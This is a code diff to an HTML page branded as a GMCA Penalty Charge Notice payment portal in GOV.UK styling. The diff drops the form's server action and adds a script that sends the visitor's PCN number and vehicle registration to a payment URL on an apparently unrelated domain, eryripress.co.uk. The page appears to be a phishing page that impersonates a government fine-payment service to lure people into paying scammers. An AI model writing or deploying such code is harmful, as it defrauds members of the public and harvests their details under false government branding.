@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
+  <title>GMCA – PCN Pay Home</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   <!-- GOV.UK Frontend CSS (includes GDS Transport font) -->
@@ -26,7 +27,7 @@
       <h1 class="page-title">Penalty Charge Notice Portal</h1>
       <p class="page-subtitle">Enter Penalty Charge Notice (PCN) number and vehicle registration</p>
 
-      <form action="/PCNs/" method="post" novalidate>
+      <form id="pcn-form" novalidate>
         <!-- PCN number -->
         <div class="form-group">
           <label for="PCN" class="form-label">PCN number</label>
@@ -56,6 +57,28 @@
       </div>
     </div>
   </main>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      const form = document.getElementById("pcn-form");
+
+      form.addEventListener("submit", function(e) {
+        e.preventDefault();
+
+        const pcn = document.getElementById("PCN").value.trim().toUpperCase();
+        const vrm = document.getElementById("VRM").value.trim().toUpperCase();
+
+        if (!pcn || !vrm) {
+          alert("Please enter both your PCN number and vehicle registration.");
+          return;
+        }
+
+        // Redirect to payment page with query parameters
+        const payUrl = `https://www.eryripress.co.uk/pay?pcn=${encodeURIComponent(pcn)}&vrm=${encodeURIComponent(vrm)}`;
+        window.location.href = payUrl;
+      });
+    });
+  </script>
 
 </body>
 </html>
